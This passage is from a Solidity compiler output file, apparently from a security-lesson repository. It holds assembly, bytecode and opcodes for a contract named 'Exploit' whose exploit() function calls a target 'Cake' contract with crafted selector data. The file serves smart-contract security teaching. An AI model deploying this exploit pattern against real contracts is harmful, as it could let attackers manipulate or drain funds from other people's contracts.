*/\n  eq\n    /* \"#utility.yul\":6693:6756   */\n  tag_123\n  jumpi\n    /* \"#utility.yul\":6752:6753   */\n  0x00\n    /* \"#utility.yul\":6749:6750   */\n  dup1\n    /* \"#utility.yul\":6742:6754   */\n  revert\n    /* \"#utility.yul\":6693:6756   */\ntag_123:\n    /* \"#utility.yul\":6640:6762   */\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6768:6911   */\ntag_41:\n    /* \"#utility.yul\":6825:6830   */\n  0x00\n    /* \"#utility.yul\":6856:6862   */\n  dup2\n    /* \"#utility.yul\":6850:6863   */\n  mload\n    /* \"#utility.yul\":6841:6863   */\n  swap1\n  pop\n    /* \"#utility.yul\":6872:6905   */\n  tag_125\n    /* \"#utility.yul\":6899:6904   */\n  dup2\n    /* \"#utility.yul\":6872:6905   */\n  tag_40\n  jump\t// in\ntag_125:\n    /* \"#utility.yul\":6768:6911   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"#utility.yul\":6917:7268   */\ntag_7:\n    /* \"#utility.yul\":6987:6993   */\n  0x00\n    /* \"#utility.yul\":7036:7038   */\n  0x20\n    /* \"#utility.yul\":7024:7033   */\n  dup3\n    /* \"#utility.yul\":7015:7022   */\n  dup5\n    /* \"#utility.yul\":7011:7034   */\n  sub\n    /* \"#utility.yul\":7007:7039   */\n  slt\n    /* \"#utility.yul\":7004:7123   */\n  iszero\n  tag_127\n  jumpi\n    /* \"#utility.yul\":7042:7121   */\n  tag_128\n  tag_36\n  jump\t// in\ntag_128:\n    /* \"#utility.yul\":7004:7123   */\ntag_127:\n    /* \"#utility.yul\":7162:7163   */\n  0x00\n    /* \"#utility.yul\":7187:7251   */\n  tag_129\n    /* \"#utility.yul\":7243:7250   */\n  dup5\n    /* \"#utility.yul\":7234:7240   */\n  dup3\n    /* \"#utility.yul\":7223:7232   */\n  dup6\n    /* \"#utility.yul\":7219:7241   */\n  add\n    /* \"#utility.yul\":7187:7251   */\n  tag_41\n  jump\t// in\ntag_129:\n    /* \"#utility.yul\":7177:7251   */\n  swap2\n  pop\n    /* \"#utility.yul\":7133:7261   */\n  pop\n    /* \"#utility.yul\":6917:7268   */\n  swap3\n  swap2\n  pop\n  pop\n  jump\t// out\n    /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":186:436  contract Exploit {... */\ntag_10:\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":186:436  contract Exploit {... */\n      mstore(0x40, 0x80)\n      callvalue\n      dup1\n      iszero\n      tag_1\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_1:\n      pop\n      jumpi(tag_2, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x63d9b770\n      eq\n      tag_3\n      jumpi\n      dup1\n      0xdce17484\n      eq\n      tag_4\n      jumpi\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":366:434  function exploit() external {... */\n    tag_3:\n      tag_5\n      tag_6\n      jump\t// in\n    tag_5:\n      stop\n        /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":209:228  address public cake */\n    tag_4:\n      tag_7\n      tag_8\n      jump\t// in\n    tag_7:\n      mload(0x40)\n      tag_9\n      swap2\n      swap1\n      tag_10\n      jump\t// in\n    tag_9:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":366:434  function exploit() external {... */\n    tag_6:\n        /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":409:413  cake */\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n        /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":404:421  Cake(cake).dosome */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0x0d8f9738\n        /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":422:426  data */\n      0x01\n        /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":404:427  Cake(cake).dosome(data) */\n      mload(0x40)\n      dup3\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_12\n      swap2\n      swap1\n      tag_13\n      jump\t// in\n    tag_12:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_14\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_14:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_16\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_16:\n      pop\n      pop\n      pop\n      pop\n        /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":366:434  function exploit() external {... */\n      jump\t// out\n        /* \"SecLessonPoc-main/contracts/selector/attack/cakeAttack.sol\":209:228  address public cake */\n    tag_8:\n      0x00\n      dup1\n      sload\n      swap1\n      0x0100\n      exp\n      swap1\n      div\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      dup2\n      jump\t// out\n        /* \"#utility.yul\":7:133   */\n    tag_17:\n        /* \"#utility.yul\":44:51   */\n      0x00\n        /* \"#utility.yul\":84:126   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":77:82   */\n      dup3\n        /* \"#utility.yul\":73:127   */\n      and\n        /* \"#utility.yul\":62:127   */\n      swap1\n      pop\n        /* \"#utility.yul\":7:133   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":139:235   */\n    tag_18:\n        /* \"#utility.yul\":176:183   */\n      0x00\n        /* \"#utility.yul\":205:229   */\n      tag_28\n        /* \"#utility.yul\":223:228   */\n      dup3\n        /* \"#utility.yul\":205:229   */\n      tag_17\n      jump\t// in\n    tag_28:\n        /* \"#utility.yul\":194:229   */\n      swap1\n      pop\n        /* \"#utility.yul\":139:235   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":241:359   */\n    tag_19:\n        /* \"#utility.yul\":328:352   */\n      tag_30\n        /* \"#utility.yul\":346:351   */\n      dup2\n        /* \"#utility.yul\":328:352   */\n      tag_18\n      jump\t// in\n    tag_30:\n        /* \"#utility.yul\":323:326   */\n      dup3\n        /* \"#utility.yul\":316:353   */\n      mstore\n        /* \"#utility.yul\":241:359   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":365:587   */\n    tag_10:\n        /* \"#utility.yul\":458:462   */\n      0x00\n        /* \"#utility.yul\":496:498   */\n      0x20\n        /* \"#utility.yul\":485:494   */\n      dup3\n        /* \"#utility.yul\":481:499   */\n      add\n        /* \"#utility.yul\":473:499   */\n      swap1\n      pop\n        /* \"#utility.yul\":509:580   */\n      tag_32\n        /* \"#utility.yul\":577:578   */\n      0x00\n        /* \"#utility.yul\":566:575   */\n      dup4\n        /* \"#utility.yul\":562:579   */\n      add\n        /* \"#utility.yul\":553:559   */\n      dup5\n        /* \"#utility.yul\":509:580   */\n      tag_19\n      jump\t// in\n    tag_32:\n        /* \"#utility.yul\":365:587   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":593:773   */\n    tag_20:\n        /* \"#utility.yul\":641:718   */\n      0x4e487b7100000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":638:639   */\n      0x00\n        /* \"#utility.yul\":631:719   */\n      mstore\n        /* \"#utility.yul\":738:742   */\n      0x22\n        /* \"#utility.yul\":735:736   */\n      0x04\n        /* \"#utility.yul\":728:743   */\n      mstore\n        /* \"#utility.yul\":762:766   */\n      0x24\n        /* \"#utility.yul\":759:760   */\n      0x00\n        /* \"#utility.yul\":752:767   */\n      revert\n        /* \"#utility.yul\":779:1099   */\n    tag_21:\n        /* \"#utility.yul\":823:829   */\n      0x00\n        /* \"#utility.yul\":860:861   */\n      0x02\n        /* \"#utility.yul\":854:858   */\n      dup3\n        /* \"#utility.yul\":850:862   */\n      div\n        /* \"#utility.yul\":840:862   */\n      swap1\n      pop\n        /* \"#utility.yul\":907:908   */\n      0x01\n        /* \"#utility.yul\":901:905   */\n      dup3\n        /* \"#utility.yul\":897:909   */\n      and\n        /* \"#utility.yul\":928:946   */\n      dup1\n        /* \"#utility.yul\":918:999   */\n      tag_35\n      jumpi\n        /* \"#utility.yul\":984:988   */\n      0x7f\n        /* \"#utility.yul\":976:982   */\n      dup3\n        /* \"#utility.yul\":972:989   */\n      and\n        /* \"#utility.yul\":962:989   */\n      swap2\n      pop\n        /* \"#utility.yul\":918:999   */\n    tag_35:\n        /* \"#utility.yul\":1046:1048   */\n      0x20\n        /* \"#utility.yul\":1038:1044   */\n      dup3\n        /* \"#utility.yul\":1035:1049   */\n      lt\n        /* \"#utility.yul\":1015:1033   */\n      dup2\n        /* \"#utility.yul\":1012:1050   */\n      sub\n        /* \"#utility.yul\":1009:1093   */\n      tag_36\n      jumpi\n        /* \"#utility.yul\":1065:1083   */\n      tag_37\n      tag_20\n      jump\t// in\n    tag_37:\n        /* \"#utility.yul\":1009:1093   */\n    tag_36:\n        /* \"#utility.yul\":830:1099   */\n      pop\n        /* \"#utility.yul\":779:1099   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1105:1273   */\n    tag_22:\n        /* \"#utility.yul\":1188:1199   */\n      0x00\n        /* \"#utility.yul\":1222:1228   */\n      dup3\n        /* \"#utility.yul\":1217:1220   */\n      dup3\n        /* \"#utility.yul\":1210:1229   */\n      mstore\n        /* \"#utility.yul\":1262:1266   */\n      0x20\n        /* \"#utility.yul\":1257:1260   */\n      dup3\n        /* \"#utility.yul\":1253:1267   */\n      add\n        /* \"#utility.yul\":1238:1267   */\n      swap1\n      pop\n        /* \"#utility.yul\":1105:1273   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1279:1419   */\n    tag_23:\n        /* \"#utility.yul\":1327:1331   */\n      0x00\n        /* \"#utility.yul\":1350:1353   */\n      dup2\n        /* \"#utility.yul\":1342:1353   */\n      swap1\n      pop\n        /* \"#utility.yul\":1373:1376   */\n      dup2\n        /* \"#utility.yul\":1370:1371   */\n      0x00\n        /* \"#utility.yul\":1363:1377   */\n      mstore\n        /* \"#utility.yul\":1407:1411   */\n      0x20\n        /* \"#utility.yul\":1404:1405   */\n      0x00\n        /* \"#utility.yul\":1394:1412   */\n      keccak256\n        /* \"#utility.yul\":1386:1412   */\n      swap1\n      pop\n        /* \"#utility.yul\":1279:1419   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1447:2274   */\n    tag_24:\n        /* \"#utility.yul\":1530:1533   */\n      0x00\n        /* \"#utility.yul\":1567:1572   */\n      dup2\n        /* \"#utility.yul\":1561:1573   */\n      sload\n        /* \"#utility.yul\":1596:1632   */\n      tag_41\n        /* \"#utility.yul\":1622:1631   */\n      dup2\n        /* \"#utility.yul\":1596:1632   */\n      tag_21\n      jump\t// in\n    tag_41:\n        /* \"#utility.yul\":1648:1718   */\n      tag_42\n        /* \"#utility.yul\":1711:1717   */\n      dup2\n        /* \"#utility.yul\":1706:1709   */\n      dup7\n        /* \"#utility.yul\":1648:1718   */\n      tag_22\n      jump\t// in\n    tag_42:\n        /* \"#utility.yul\":1641:1718   */\n      swap5\n      pop\n        /* \"#utility.yul\":1749:1750   */\n      0x01\n        /* \"#utility.yul\":1738:1747   */\n      dup3\n        /* \"#utility.yul\":1734:1751   */\n      and\n        /* \"#utility.yul\":1765:1766   */\n      0x00\n        /* \"#utility.yul\":1760:1924   */\n      dup2\n      eq\n      tag_44\n      jumpi\n        /* \"#utility.yul\":1938:1939   */\n      0x01\n        /* \"#utility.yul\":1933:2268   */\n      dup2\n      eq\n      tag_45\n      jumpi\n        /* \"#utility.yul\":1727:2268   */\n      jump(tag_43)\n        /* \"#utility.yul\":1760:1924   */\n    tag_44:\n        /* \"#utility.yul\":1844:1848   */\n      0xff\n        /* \"#utility.yul\":1840:1849   */\n      not\n        /* \"#utility.yul\":1829:1838   */\n      dup4\n        /* \"#utility.yul\":1825:1850   */\n      and\n        /* \"#utility.yul\":1820:1823   */\n      dup7\n        /* \"#utility.yul\":1813:1851   */\n      mstore\n        /* \"#utility.yul\":1904:1910   */\n      dup2\n        /* \"#utility.yul\":1897:1911   */\n      iszero\n        /* \"#utility.yul\":1890:1912   */\n      iszero\n        /* \"#utility.yul\":1884:1888   */\n      0x20\n        /* \"#utility.yul\":1880:1913   */\n      mul\n        /* \"#utility.yul\":1875:1878   */\n      dup7\n        /* \"#utility.yul\":1871:1914   */\n      add\n        /* \"#utility.yul\":1864:1914   */\n      swap4\n      pop\n        /* \"#utility.yul\":1760:1924   */\n      jump(tag_43)\n        /* \"#utility.yul\":1933:2268   */\n    tag_45:\n        /* \"#utility.yul\":2000:2037   */\n      tag_46\n        /* \"#utility.yul\":2031:2036   */\n      dup6\n        /* \"#utility.yul\":2000:2037   */\n      tag_23\n      jump\t// in\n    tag_46:\n        /* \"#utility.yul\":2059:2060   */\n      0x00\n        /* \"#utility.yul\":2073:2227   */\n    tag_47:\n        /* \"#utility.yul\":2087:2093   */\n      dup4\n        /* \"#utility.yul\":2084:2085   */\n      dup2\n        /* \"#utility.yul\":2081:2094   */\n      lt\n        /* \"#utility.yul\":2073:2227   */\n      iszero\n      tag_49\n      jumpi\n        /* \"#utility.yul\":2161:2168   */\n      dup2\n        /* \"#utility.yul\":2155:2169   */\n      sload\n        /* \"#utility.yul\":2151:2152   */\n      dup2\n        /* \"#utility.yul\":2146:2149   */\n      dup10\n        /* \"#utility.yul\":2142:2153   */\n      add\n        /* \"#utility.yul\":2135:2170   */\n      mstore\n        /* \"#utility.yul\":2211:2212   */\n      0x01\n        /* \"#utility.yul\":2202:2209   */\n      dup3\n        /* \"#utility.yul\":2198:2213   */\n      add\n        /* \"#utility.yul\":2187:2213   */\n      swap2\n      pop\n        /* \"#utility.yul\":2109:2113   */\n      0x20\n        /* \"#utility.yul\":2106:2107   */\n      dup2\n        /* \"#utility.yul\":2102:2114   */\n      add\n        /* \"#utility.yul\":2097:2114   */\n      swap1\n      pop\n        /* \"#utility.yul\":2073:2227   */\n      jump(tag_47)\n    tag_49:\n        /* \"#utility.yul\":2256:2257   */\n      dup1\n        /* \"#utility.yul\":2251:2254   */\n      dup9\n        /* \"#utility.yul\":2247:2258   */\n      add\n        /* \"#utility.yul\":2240:2258   */\n      swap6\n      pop\n        /* \"#utility.yul\":1940:2268   */\n      pop\n      pop\n        /* \"#utility.yul\":1727:2268   */\n    tag_43:\n      pop\n        /* \"#utility.yul\":1534:2274   */\n      pop\n      pop\n        /* \"#utility.yul\":1447:2274   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2280:2583   */\n    tag_13:\n        /* \"#utility.yul\":2388:2392   */\n      0x00\n        /* \"#utility.yul\":2426:2428   */\n      0x20\n        /* \"#utility.yul\":2415:2424   */\n      dup3\n        /* \"#utility.yul\":2411:2429   */\n      add\n        /* \"#utility.yul\":2403:2429   */\n      swap1\n      pop\n        /* \"#utility.yul\":2475:2484   */\n      dup2\n        /* \"#utility.yul\":2469:2473   */\n      dup2\n        /* \"#utility.yul\":2465:2485   */\n      sub\n        /* \"#utility.yul\":2461:2462   */\n      0x00\n        /* \"#utility.yul\":2450:2459   */\n      dup4\n        /* \"#utility.yul\":2446:2463   */\n      add\n        /* \"#utility.yul\":2439:2486   */\n      mstore\n        /* \"#utility.yul\":2503:2576   */\n      tag_51\n        /* \"#utility.yul\":2571:2575   */\n      dup2\n        /* \"#utility.yul\":2562:2568   */\n      dup5\n        /* \"#utility.yul\":2503:2576   */\n      tag_24\n      jump\t// in\n    tag_51:\n        /* \"#utility.yul\":2495:2576   */\n      swap1\n      pop\n        /* \"#utility.yul\":2280:2583   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa264697066735822122076b69f8b78acce75c91ef3185a855d657303b98f582e7a4ce6c5c7b9e85ee9c364736f6c63430008130033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405260008060405160240161001892919061016a565b6040516020818303038152906040527f7986d613000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050600190816100a391906103d9565b503480156100b057600080fd5b5060405161081d38038061081d83398181016040528101906100d2919061050e565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505061053b565b6000819050919050565b600060ff82169050919050565b6000819050919050565b600061015461014f61014a84610118565b61012f565b610122565b9050919050565b61016481610139565b82525050565b600060408201905061017f600083018561015b565b61018c602083018461015b565b9392505050565b600081519050919050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052604160045260246000fd5b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b6000600282049050600182168061021457607f821691505b602082108103610227576102266101cd565b5b50919050565b60008190508160005260206000209050919050565b60006020601f8301049050919050565b600082821b905092915050565b60006008830261028f7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff82610252565b6102998683610252565b95508019841693508086168417925050509392505050565b6000819050919050565b60006102d66102d16102cc846102b1565b61012f565b6102b1565b9050919050565b6000819050919050565b6102f0836102bb565b6103046102fc826102dd565b84845461025f565b825550505050565b600090565b61031961030c565b6103248184846102e7565b505050565b5b818110156103485761033d600082610311565b60018101905061032a565b5050565b601f82111561038d5761035e8161022d565b61036784610242565b81016020851015610376578190505b61038a61038285610242565b830182610329565b50505b505050565b600082821c905092915050565b60006103b060001984600802610392565b1980831691505092915050565b60006103c9838361039f565b9150826002028217905092915050565b6103e282610193565b67ffffffffffffffff8111156103fb576103fa61019e565b5b61040582546101fc565b61041082828561034c565b600060209050601f8311600181146104435760008415610431578287015190505b61043b85826103bd565b8655506104a3565b601f1984166104518661022d565b60005b8281101561047957848901518255600182019150602085019450602081019050610454565b868310156104965784890151610492601f89168261039f565b8355505b6001600288020188555050505b505050505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006104db826104b0565b9050919050565b6104eb816104d0565b81146104f657600080fd5b50565b600081519050610508816104e2565b92915050565b600060208284031215610524576105236104ab565b5b6000610532848285016104f9565b91505092915050565b6102d38061054a6000396000f3fe608060405234801561001057600080fd5b50600436106100365760003560e01c806363d9b7701461003b578063dce1748414610045575b600080fd5b610043610063565b005b61004d6100f1565b60405161005a9190610156565b60405180910390f35b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16630d8f973860016040518263ffffffff1660e01b81526004016100bd919061027b565b600060405180830381600087803b1580156100d757600080fd5b505af11580156100eb573d6000803e3d6000fd5b50505050565b60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b600061014082610115565b9050919050565b61015081610135565b82525050565b600060208201905061016b6000830184610147565b92915050565b7f4e487b7100000000000000000000000000000000000000000000000000000000600052602260045260246000fd5b600060028204905060018216806101b857607f821691505b6020821081036101cb576101ca610171565b5b50919050565b600082825260208201905092915050565b60008190508160005260206000209050919050565b60008154610204816101a0565b61020e81866101d1565b94506001821660008114610229576001811461023f57610272565b60ff198316865281151560200286019350610272565b610248856101e2565b60005b8381101561026a5781548189015260018201915060208101905061024b565b808801955050505b50505092915050565b6000602082019050818103600083015261029581846101f7565b90509291505056fea264697066735822122076b69f8b78acce75c91ef3185a855d657303b98f582e7a4ce6c5c7b9e85ee9c364736f6c63430008130033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH1 0x0 DUP1 PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x18 SWAP3 SWAP2 SWAP1 PUSH2 0x16A JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x7986D61300000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x1 SWAP1 DUP2 PUSH2 0xA3 SWAP2 SWAP1 PUSH2 0x3D9 JUMP JUMPDEST POP CALLVALUE DUP1 ISZERO PUSH2 0xB0 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0x81D CODESIZE SUB DUP1 PUSH2 0x81D DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0xD2 SWAP2 SWAP1 PUSH2 0x50E JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x53B JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0xFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x154 PUSH2 0x14F PUSH2 0x14A DUP5 PUSH2 0x118 JUMP JUMPDEST PUSH2 0x12F JUMP JUMPDEST PUSH2 0x122 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x164 DUP2 PUSH2 0x139 JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 DUP3 ADD SWAP1 POP PUSH2 0x17F PUSH1 0x0 DUP4 ADD DUP6 PUSH2 0x15B JUMP JUMPDEST PUSH2 0x18C PUSH1 0x20 DUP4 ADD DUP5 PUSH2 0x15B JUMP JUMPDEST SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x41 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH32 0x4E487B7100000000000000000000000000000000000000000000000000000000 PUSH1 0x0 MSTORE PUSH1 0x22 PUSH1 0x4 MSTORE PUSH1 0x24 PUSH1 0x0 REVERT JUMPDEST PUSH1 0x0 PUSH1 0x2 DUP3 DIV SWAP1 POP PUSH1 0x1 DUP3 AND DUP1 PUSH2 0x214 JUMPI PUSH1 0x7F DUP3 AND SWAP2 POP JUMPDEST PUSH1 0x20 DUP3 LT DUP2 SUB PUSH2 0x227 JUMPI PUSH2 0x226 PUSH2 0x1CD JUMP JUMPDEST JUMPDEST POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP DUP2 PUSH1 0x0 MSTORE PUSH1 0x20 PUSH1 0x0 KECCAK256 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 PUSH1 0x1F DUP4 ADD DIV SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 SHL SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x8 DUP4 MUL PUSH2 0x28F PUSH32 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 PUSH2 0x252 JUMP JUMPDEST PUSH2 0x299 DUP7 DUP4 PUSH2 0x252 JUMP JUMPDEST SWAP6 POP DUP1 NOT DUP5 AND SWAP4 POP DUP1 DUP7 AND DUP5 OR SWAP3 POP POP POP SWAP4 SWAP3 POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x2D6 PUSH2 0x2D1 PUSH2 0x2CC DUP5 PUSH2 0x2B1 JUMP JUMPDEST PUSH2 0x12F JUMP JUMPDEST PUSH2 0x2B1 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x2F0 DUP4 PUSH2 0x2BB JUMP JUMPDEST PUSH2 0x304 PUSH2 0x2FC DUP3 PUSH2 0x2DD JUMP JUMPDEST DUP5 DUP5 SLOAD PUSH2 0x25F JUMP JUMPDEST DUP3 SSTORE POP POP POP POP JUMP JUMPDEST PUSH1 0x0 SWAP1 JUMP JUMPDEST PUSH2 0x319 PUSH2 0x30C JUMP JUMPDEST PUSH2 0x324 DUP2 DUP5 DUP5 PUSH2 0x2E7 JUMP JUMPDEST POP POP POP JUMP JUMPDEST JUMPDEST DUP2 DUP2 LT ISZERO PUSH2 0x348 JUMPI PUSH2 0x33D PUSH1 0x0 DUP3 PUSH2 0x311 JUMP JUMPDEST PUSH1 0x1 DUP2 ADD SWAP1 POP PUSH2 0x32A JUMP JUMPDEST POP POP JUMP JUMPDEST PUSH1 0x1F DUP3 GT ISZERO PUSH2 0x38D JUMPI PUSH2 0x35E DUP2 PUSH2 0x22D JUMP JUMPDEST PUSH2 0x367 DUP5 PUSH2 0x242 JUMP JUMPDEST DUP2 ADD PUSH1 0x20 DUP6 LT ISZERO PUSH2 0x376 JUMPI DUP2 SWAP1 POP JUMPDEST PUSH2 0x38A PUSH2 0x382 DUP6 PUSH2 0x242 JUMP JUMPDEST DUP4 ADD DUP3 PUSH2 0x329 JUMP JUMPDEST POP POP JUMPDEST POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP3 DUP3 SHR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3B0 PUSH1 0x0 NOT DUP5 PUSH1 0x8 MUL PUSH2 0x392 JUMP JUMPDEST NOT DUP1 DUP4 AND SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x3C9 DUP4 DUP4 PUSH2 0x39F JUMP JUMPDEST SWAP2 POP DUP3 PUSH1 0x2 MUL DUP3 OR SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x3E2 DUP3 PUSH2 0x193 JUMP JUMPDEST PUSH8 0xFFFFFFFFFFFFFFFF DUP2 GT ISZERO PUSH2 0x3FB JUMPI PUSH2 0x3FA PUSH2 0x19E JUMP JUMPDEST JUMPDEST PUSH2 0x405 DUP3 SLOAD PUSH2 0x1FC JUMP JUMPDEST PUSH2 0x410 DUP3 DUP3 DUP6 PUSH2 0x34C JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 SWAP1 POP PUSH1 0x1F DUP4 GT PUSH1 0x1 DUP2 EQ PUSH2 0x443 JUMPI PUSH1 0x0 DUP5 ISZERO PUSH2 0x431 JUMPI DUP3 DUP8 ADD MLOAD SWAP1 POP JUMPDEST PUSH2 0x43B DUP6 DUP3 PUSH2 0x3BD JUMP JUMPDEST DUP7 SSTORE POP PUSH2 0x4A3 JUMP JUMPDEST PUSH1 0x1F NOT DUP5 AND PUSH2 0x451 DUP7 PUSH2 0x22D JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP3 DUP2 LT ISZERO PUSH2 0x479 JUMPI DUP5 DUP10 ADD MLOAD DUP3 SSTORE PUSH1 0x1 DUP3 ADD SWAP2 POP PUSH1 0x20 DUP6 ADD SWAP5 POP PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x454 JUMP JUMPDEST DUP7 DUP4 LT ISZERO PUSH2 0x496 JUMPI DUP5 DUP10 ADD MLOAD PUSH2 0x492 PUSH1 0x1F DUP10 AND DUP3 PUSH2 0x39F JUMP JUMPDEST DUP4 SSTORE POP JUMPDEST PUSH1 0x1 PUSH1 0x2 DUP9 MUL ADD DUP9 SSTORE POP POP POP JUMPDEST POP POP POP POP POP POP JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x4DB DUP3 PUSH2 0x4B0 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x4EB DUP2 PUSH2 0x4D0 JUMP JUMPDEST DUP2 EQ PUSH2 0x4F6 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP 